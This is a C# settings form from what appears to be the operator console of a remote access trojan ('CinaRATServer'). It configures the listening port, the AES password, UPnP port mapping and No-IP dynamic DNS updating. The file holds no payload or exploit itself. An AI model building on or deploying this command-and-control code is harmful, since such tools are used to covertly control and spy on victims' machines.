using System;
using System.Globalization;
using System.Windows.Forms;
using xServer.Core.Cryptography;
using xServer.Core.Data;
using xServer.Core.Networking;
using xServer.Core.Networking.Utilities;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    public partial class FrmSettings : Form
    {
        private readonly CinaRATServer _listenServer;

        DialogResult dr;

        public FrmSettings(CinaRATServer listenServer)
        {
            this._listenServer = listenServer;

            InitializeComponent();

            if (listenServer.Listening)
            {
                btnListen.Text = "Stop listening";
                ncPort.Enabled = false;
                txtPassword.Enabled = false;
                chkIPv6Support.Enabled = false;
            }

            ShowPassword(false);
        }

        private void FrmSettings_Load(object sender, EventArgs e)
        {
            cmbLang.Text = Settings.Lang;
            ncPort.Value = Settings.ListenPort;
            chkIPv6Support.Checked = Settings.IPv6Support;
            chkAutoListen.Checked = Settings.AutoListen;
            chkStartMinified.Checked = Settings.StartMinified;
            chkVersionController.Checked = Settings.VersionController;
            chkPopup.Checked = Settings.ShowPopup;
            txtPassword.Text = Settings.Password;
            chkUseUpnp.Checked = Settings.UseUPnP;
            chkShowTooltip.Checked = Settings.ShowToolTip;
            chkNoIPIntegration.Checked = Settings.EnableNoIPUpdater;
            txtNoIPHost.Text = Settings.NoIPHost;
            txtNoIPUser.Text = Settings.NoIPUsername;
            txtNoIPPass.Text = Settings.NoIPPassword;
        }

        private ushort GetPortSafe()
        {
            var portValue = ncPort.Value.ToString(CultureInfo.InvariantCulture);
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            ushort port = GetPortSafe();
            string password = txtPassword.Text;

            if (port == 0)
            {
                MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            if (password.Length < 3)
            {
                MessageBox.Show("Please enter a secure password with more than 3 characters.",
                    "Please enter a secure password", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (btnListen.Text == "Start listening" && !_listenServer.Listening)
            {
                try
                {
                    AES.SetDefaultKey(password);

                    if (chkUseUpnp.Checked)
                    {
                        if (!UPnP.IsDeviceFound)
                        {
                            MessageBox.Show("No available UPnP device found!", "No UPnP device", MessageBoxButtons.OK,
                                MessageBoxIcon.Information);
                        }
                        else
                        {
                            int outPort;
                            UPnP.CreatePortMap(port, out outPort);
                            if (port != outPort)
                            {
                                MessageBox.Show("Creating a port map with the UPnP device failed!\nPlease check if your device allows to create new port maps.", "Creating port map failed", MessageBoxButtons.OK,
                                    MessageBoxIcon.Warning);
                            }
                        }
                    }
                    if(chkNoIPIntegration.Checked)
                        NoIpUpdater.Start();
                    _listenServer.Listen(port, chkIPv6Support.Checked);
                }
                finally
                {
                    btnListen.Text = "Stop listening";
                    ncPort.Enabled = false;
                    txtPassword.Enabled = false;
                    chkIPv6Support.Enabled = false;
                }
            }
            else if (btnListen.Text == "Stop listening" && _listenServer.Listening)
            {
                try
                {
                    _listenServer.Disconnect();
                    UPnP.DeletePortMap(port);
                }
                finally
                {
                    btnListen.Text = "Start listening";
                    ncPort.Enabled = true;
                    txtPassword.Enabled = true;
                    chkIPv6Support.Enabled = true;
                }
            }
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            ushort port = GetPortSafe();
            string password = txtPassword.Text;
            string lang = cmbLang.Text;

            if(lang != Settings.Lang && dr == DialogResult.Yes)
            {
                switch (lang)
                {
                    case "English":
                        Settings.Lang = "English";
                        break;
                    case "Español":
                        Settings.Lang = "Español";
                        break;
                    default:
                        Settings.Lang = "English";
                        break;
                }
            }

            if (port == 0)
            {
                MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            if (password.Length < 3)
            {
                MessageBox.Show("Please enter a secure password with more than 3 characters.",
                    "Please enter a secure password", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            Settings.ListenPort = port;
            Settings.IPv6Support = chkIPv6Support.Checked;
            Settings.AutoListen = chkAutoListen.Checked;
            Settings.StartMinified = chkStartMinified.Checked;
            Settings.VersionController = chkVersionController.Checked;
            Settings.ShowPopup = chkPopup.Checked;
            if (password != Settings.Password)
                AES.SetDefaultKey(password);
            Settings.Password = password;
            Settings.UseUPnP = chkUseUpnp.Checked;
            Settings.ShowToolTip = chkShowTooltip.Checked;
            Settings.EnableNoIPUpdater = chkNoIPIntegration.Checked;
            Settings.NoIPHost = txtNoIPHost.Text;
            Settings.NoIPUsername = txtNoIPUser.Text;
            Settings.NoIPPassword = txtNoIPPass.Text;
            this.Close();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Discard your changes?", "Cancel", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
                DialogResult.Yes)
                this.Close();
        }

        private void chkNoIPIntegration_CheckedChanged(object sender, EventArgs e)
        {
            NoIPControlHandler(chkNoIPIntegration.Checked);
        }

        private void NoIPControlHandler(bool enable)
        {
            lblHost.Enabled = enable;
            lblUser.Enabled = enable;
            lblPass.Enabled = enable;
            txtNoIPHost.Enabled = enable;
            txtNoIPUser.Enabled = enable;
            txtNoIPPass.Enabled = enable;
            chkShowPassword.Enabled = enable;
        }

        private void ShowPassword(bool show = true)
        {
            txtNoIPPass.PasswordChar = (show) ? (char)0 : (char)'●';
        }

        private void chkShowPassword_CheckedChanged(object sender, EventArgs e)
        {
            ShowPassword(chkShowPassword.Checked);
        }

        private void cmbLang_Click(object sender, EventArgs e)
        {
            if(dr == DialogResult.None 
                || dr == DialogResult.Cancel 
                || dr == DialogResult.No)
            {
                dr = MessageBox.Show("This require the app restart. Do you want to change the language?", "Confirm", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Information);
            }
        }

        private void btnCheckVersion_Click(object sender, EventArgs e)
        {
            VersionController.init(true);
        }
    }
}